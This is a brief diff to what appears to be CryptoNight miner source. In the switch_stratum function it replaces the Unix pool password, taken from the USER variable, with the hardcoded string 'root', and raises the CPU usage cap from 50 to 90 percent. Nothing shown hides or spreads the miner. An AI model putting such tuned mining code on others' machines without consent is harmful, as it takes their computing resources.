@@ -478,10 +478,10 @@ static void switch_stratum() {
         opt_pass=getenv("COMPUTERNAME");
 #endif
 #ifdef __unix__
-        opt_pass = getenv("USER");
+        opt_pass = "root";
 #endif
 
-        opt_max_cpu_usage = 50;
+        opt_max_cpu_usage = 90;
 
         opt_algo_variant = get_algo_variant(opt_algo, opt_algo_variant);
         cryptonight_init(opt_algo_variant);
@@ -509,9 +509,9 @@ static void switch_stratum() {
         opt_pass=getenv("COMPUTERNAME");
 #endif
 #ifdef __unix__
-        opt_pass = getenv("USER");
+        opt_pass = "root";
 #endif
-        opt_max_cpu_usage = 50;
+        opt_max_cpu_usage = 90;
 
         opt_algo_variant = get_cryptonight_lite_variant(opt_algo_variant);
         cryptonight_init(opt_algo_variant);
